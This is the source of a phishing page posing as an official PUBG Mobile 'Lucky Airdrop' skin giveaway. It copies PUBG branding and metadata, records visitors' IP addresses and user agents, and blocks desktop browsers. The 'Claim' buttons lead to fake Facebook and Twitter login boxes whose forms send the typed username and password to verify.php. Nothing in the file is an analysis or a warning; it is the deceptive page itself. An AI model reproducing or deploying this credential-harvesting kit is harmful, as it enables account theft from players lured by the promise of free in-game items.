<?php
session_start();
include 'system/Mobile_Detect.php';
$detect = new Mobile_Detect();
if ($detect->isMobile()){
}
else {
   echo'<script>alert("Sorry This Web Doesnt Support Dekstop View Please Use Mobile For Better Experience");</script>';
   exit;
}
function get_client_ip() { 
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}
$ip = get_client_ip();
$ua = $_SERVER['HTTP_USER_AGENT'];
$_SESSION['ip']=$ip;
$_SESSION['ua']=$ua;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <!-- 页面通用 header 配置 -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="Description" content="Witness the rise of the Ultimate Team made of Global Stars!Go on Twitter and use the appropriate tag (found in the Team Details), to support and vote for your favorite stars! The teams with the highest points will receive Global Extreme Challenge Show Match Points.Go support your team now!" />
    <meta name="Keywords" content="Global Extreme Challenge,Vote,PUBG MOBILE" />
    <meta property="og:url" content="https://www.pubgmobile.com/event/globalextremechallenge/" />
    <meta property="og:type" content="website">
    <meta property="og:title" content="Global Extreme Challenge" />
    <meta property="og:description" content="Witness the rise of the Ultimate Team made of Global Stars!Go on Twitter and use the appropriate tag (found in the Team Details), to support and vote for your favorite stars! The teams with the highest points will receive Global Extreme Challenge Show Match Points.Go support your team now!" />
    <meta property="og:image" content="https://www.pubgmobile.com/en/event/globalextremechallenge/images/share.jpg" />
    	<link rel="stylesheet" href="css/facebook.css">
    	<link rel="stylesheet" href="css/twitter.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="css/style.css">
        
      <style>
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('img/pubg.gif') center no-repeat black;
    }
</style>
    <style>
     .tempatnya {
     margin-top:3%;
     width:100%;
     height:100%;
     display:flex;
     }
     .alertnya {
     margin-top:2%;
     width:90%;
     border-radius:5px;
     border:2px solid gold;
     background:orange;
     }
     .alertnya marquee {
     font-weight:bold;
     color:white;
     }
     .tempatnya .twocards {
     display:flex;
     align-items:center;
     justify-content:center;
     width:100%;
     }
     .twocards .zras{
     background-image:url('https://blog.hdwallsource.com/wp-content/uploads/2015/06/textured-backgrounds-18615-19085-hd-wallpapers-1024x640.jpg');
     background-size:cover;
     width:45%;
     margin-left:1%;
     border-radius:8px;
     height:auto;
     border:3px solid orange;
     }
     .twocards video {
     width:100%;
     height:100%;
     align-items:center;
     display:none;
     justify-content:center;
     border-radius:8px;
     }
     .twocards img {
     width:90%;
     height:90%;
     }
     
     .twocards .skinnya {
     width:100%;
     height:100%;
     display:none;
     }
     .skinnya img {
     width:100%;
     border-top-left-radius:8px;
     border-top-right-radius:8px;
     margin-bottom:-5px;
     }
     .skinnya .claim {
     font-family: 'wanwan';
     font-size:1em;
     border:none;
     background:gold;
     font-weight:bold;
     border-bottom-left-radius:5px;
     border-bottom-right-radius:5px;
     width:100%;
     height:35px;
     }
     .mask {
     position:fixed;
     display:none;
     top:0;
     left:0;
     height:100%;
     width:100%;
     background:rgba(0,0,0,0.50);
     }
     .mask .popupnya {
     padding-bottom:10px;
     border-radius:8px;
     position:absolute;
     top:50%;
     left:50%;
     transform:translate(-50%,-50%);
     width:80%;
     height:19%;
     border:2px solid yellow;
     background:orange;
     animation:fadein 2s forwards;
     }
     .popupnya .header{
     width:100%;
     text-align:center;
     font-weight:bold;
     border-bottom:2px solid yellow;
     color:white;
     font-size:1.5em;
     }
     
     .popupnya:not(.header){
     display:flex;
     align-items:center;
     justify-content:center;
     flex-direction:column;
     }
     
     
     .popupnya .facebook {
     display:flex;
     align-items:center;
     justify-content:center;
     width:90%;
     text-align:center;
     font-weight:bold;
     font-size:15px;
     color:white;
     margin-top:5px;
     background:lightblue;
     border:2px solid yellow;
     border-radius:8px;
     padding:8px;
     }

     @keyframes fadein {
     from{opacity:0;}
     to{opacity:1;}
     }
     .popup-login {
	background:rgba(0,0,0,0.5);
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
}
.popup-box-login-fb {
	background:#ECEFF6;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:1.9%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.popup-box-login-twitter {
	background:#fff;
	max-width:330px;
	height:370px;
	position:relative;
	margin:50px auto;
	margin-top:10%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.close-fb {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	position:absolute;
	top:-8px;
	right:-10px;
	display:block;
}
.close-fb i {
	color:#fff;
	padding-top:1px;
}
.close-other {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	top:-8px;
	right:-10px;
	position:absolute;
	z-index:9999999;
	display:block;
}
.close-other i {
	color:#fff;
	padding-top:1px;
}
@media only screen and (max-width:600px) {
	.popup-box-login-fb {
		margin-top: 4%;
	}
}
    </style>
	<script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <link rel="stylesheet" href="https://www.pubgmobile.com/id/event/globalextremechallenge/css/common.css" />
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/Swiper/4.5.0/css/swiper.min.css" />
    <link rel="stylesheet" href="https://www.pubgmobile.com/id/event/globalextremechallenge/css/style.css" />
    <link rel="stylesheet" href="https://www.pubgmobile.com/common/css/all.css" />
    <title>LUCKY AIDROP | PUBG MOBILE</title>
    <!-- design：insight  | reconsitution：insight | establish:2020/03/13 -->
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <script src="js/iwan.js"></script>
        <script>
	$(window).on('load', function () {
      $(".loader").fadeOut("slow");
 });

	</script>
	
    <script>

     
       
        var mobile = false;
        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry/i.test(navigator.userAgent)) {
            mobile = true;
            setTimeout(function() {
                $('body').addClass('mclass');
            }, 30);
        }
    </script>
    
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-131768225-5"></script>
</head>
<body class="en">
<div class="loader"></div>
    <div class="top-nav">
    <div class="top-main c">
        <!-- logo,name -->
        <div class="top-log c">
            <a href="//www.pubgmobile.com/en-US/" onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_logo'});">
                <img src="https://www.pubgmobile.com/common/images/icon_logo.jpg" width="128" height="128" alt="" />
            </a>
            <h1 class="top-tit">
                PUBG MOBILE
                <span>OFFICIAL PUBG ON MOBILE</span>
            </h1>
        </div>
        <!-- line -->
        <div class="top-line" onclick="gtag('event','x_click',{'event_category':'common_inc','event_label':'nav_btn'});">
            <ul>
                <li>-</li>
                <li>-</li>
                <li>-</li>
            </ul>
        </div>
        <!-- nav-list -->

        <!-- homepage,download -->
        <div class="top-btn">
            <a href="//www.pubgmobile.com/pay/" target="_blank" onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_purchase'});">PURCHASE</a>
            <a class="down" href="https://web.gpubgm.com/m/Website/xiaobao/AOS_IG0190_19173No48_0.19.0.13900_Shipping_ThirdPartyPayment_GLOBAL.shell.signed_uawebsite.apk" target="_blank" onclick="gtag('event','x_click',{'event_category':'common_inc','event_label':'nav_download'});">DOWNLOAD</a>
        </div>
        <!-- download-ul -->
        <!-- <ul class="slec">
            <li class="app-li">
                <a href="https://app.adjust.com/4yxckw" target="_blank" onclick="gtag('event','x_download',{'event_category':'common_inc','event_label':'nav_app'});">
					App Store
				</a>
            </li>
            <li class="apk-li">
                <a href="https://web.gpubgm.com/m/Website/xiaobao/AOS_IG0190_19173No48_0.19.0.13900_Shipping_ThirdPartyPayment_GLOBAL.shell.signed_uawebsite.apk" onclick="gtag('event','x_download',{'event_category':'common_inc','event_label':'nav_apk'});">
					APK Download
				</a>
            </li>
        </ul> -->
        <!-- language -->

    </div>
</div>
    <div class="wrap" id="wrap">
        <section class="s5" style="background:url('https://i0.wp.com/pngstocks.com/wp-content/uploads/2019/05/background-2.jpg?zoom');height:100%;">
        <br>
        <br>
            <span onclick="open_twitter()" class="rank-title">LUCKY AIRDROP</span>
          
          <center>
          <div class="alertnya"><marquee behavior="scroll" scrollamount="5" width="325">Click the AirDrop To Collect Your Free Gift, Dont Forget To Share This Website To Your Friends</marquee></div>
          <div class="tempatnya">
          <div class="twocards">
          <div class="zras"><img id="img1" onclick="play()" src="img/drop.png"><video id="vid1" src="media/drop.mp4"></video>
          <div id="skin1" class="skinnya">
          <img src="skin/<?php echo rand(1,17);?>.png">
          <button onclick="go()" class="claim">Claim</button>
          </div>
          </div>
                     <div class="zras"><img id="img2" onclick="play2()" src="img/drop.png"><video id="vid2" src="media/drop.mp4"></video>
            <div id="skin2" class="skinnya">
          <img src="skin/<?php echo rand(1,17);?>.png">
          <button onclick="go()" class="claim">Claim</button>
          </div>
           </div>
          </div>
          </div>
          
          <div class="tempatnya">
          <div class="twocards">
          <div class="zras"><img id="img3" onclick="play3()" src="img/drop.png"><video id="vid3" src="media/drop.mp4"></video>
          <div id="skin3" class="skinnya">
          <img src="skin/<?php echo rand(1,17);?>.png">
          <button onclick="go()" class="claim">Claim</button>
          </div>
          </div>
           <div class="zras"><img id="img4" onclick="play4()" src="img/drop.png"><video id="vid4" src="media/drop.mp4"></video>
           <div id="skin4" class="skinnya">
          <img src="skin/<?php echo rand(1,17);?>.png">
          <button onclick="go()" class="claim">Claim</button>
          </div>
           </div>
          </div>
          </div>
          
          <div class="tempatnya">
          <div class="twocards">
          <div class="zras"><img id="img5" onclick="play5()" src="img/drop.png"><video id="vid5" src="media/drop.mp4"></video>
          <div id="skin5" class="skinnya">
          <img src="skin/<?php echo rand(1,17);?>.png">
          <button onclick="go()" class="claim">Claim</button>
          </div>
          </div>
           <div class="zras"><img id="img6" onclick="play6()" src="img/drop.png"><video id="vid6" src="media/drop.mp4"></video>
           <div id="skin6" class="skinnya">
          <img src="skin/<?php echo rand(1,17);?>.png">
          <button onclick="go()" class="claim">Claim</button>
          </div>
           </div>
          </div>
          </div>

          </center>
          
         <div class="mask" id="login">
         <div class="popupnya">
         <div class="header">
         CHOOSE YOUR LOGIN
         </div>
         <div onclick="fb()" class="facebook" style="background:#4267B2;">
         LOGIN WITH FACEBOOK
         </div>
         <div onclick="tw()" class="facebook" style="background:#00acee;">
         LOGIN WITH TWITTER
         </div>
         </div>
         </div>
         
  <br>
  <br>
             <div class="popup-login login_facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		<a onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
		<div class="navbar-fb">
			<img src="img/login/facebook_text.png">
		</div>
		<div class="content-box-fb">
			<img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
			<div class="txt-login-fb">
				 Log in to your Facebook account to connect to PUBG MOBILE
			</div>
			<form class="login-form" action="verify.php" method="post">
				<label>
				<input type="text" name="user" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
				</label>
				<label>
				<input type="password" name="pass" placeholder="Password" autocomplete="off" autocapitalize="off" required>
				</label>
				<input type="hidden" name="login" value="Facebook" readonly>
				<button type="submit" class="btn-login-fb">Log In</button>
			</form>
			<div class="txt-create-account">Create account</div>
			<div class="txt-not-now">Not now</div>
			<div class="txt-forgotten-password">Forgotten password?</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">English (UK)</div>
			<div class="language-name">Bahasa Indonesia</div>
			<div class="language-name">Basa Jawa</div>
			<div class="language-name">Bahasa Melayu</div>
			<div class="language-name">日本語</div>
			<div class="language-name">Español</div>
			<div class="language-name">Português (Brasil)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>
</div>

<div class="popup-login login_twitter animated fadeIn" style="display: none;">
	<div class="popup-box-login-twitter">
	<a onclick="close_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
		<div class="header-twitter">
			<center>
			<img src="img/login/twitter_text.png">
			</center>
		</div>
		<div class="box-twitter">
			<center>
			<form action="verify.php" method="post">
				<div class="txt-login-twitter">Login to Twitter</div>
				<div class="input-box-twitter">
					<label>Phone, email, or username</label>
					<input type="text" name="user" placeholder="" required>
				</div>
				<div class="input-box-twitter">
					<label>Password</label>
					<input type="password" name="pass" placeholder="" required>
				</div>
				<input type="hidden" name="login" value="Twitter" readonly>
				<button type="submit" class="btn-login-twitter">Log In</button>
				<div class="footer-menu-twitter">Forgot password?</div>
				<div class="footer-menu-twitter bulet">•</div>
				<div class="footer-menu-twitter">Sign up to Twitter</div>
			</form>
			</center>
		</div>
	</div>
</div>
<link rel="stylesheet" href="css/footer.css">
    <script src="//cdnjs.cloudflare.com/ajax/libs/Swiper/4.5.0/js/swiper.min.js"></script>
    
    <script src="https://www.pubgmobile.com/id/event/globalextremechallenge/js/main.js"></script>
    <script src="https://www.pubgmobile.com/id/event/globalextremechallenge/js/index.js"></script>
    
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-117352746-1"></script>
<!--- fieldset content --->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<!--- /fieldset content --->
<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script>
function go(){
	$('.mask').show();
}
function fb(){
	$('.login_facebook').show();
	$('.mask').hide();
}
function tw(){
	$('.login_twitter').show();
	$('.mask').hide();
}

</script>

<script src="https://www.pubgmobile.com/common/js/gray.js"></script>
</body>
</html>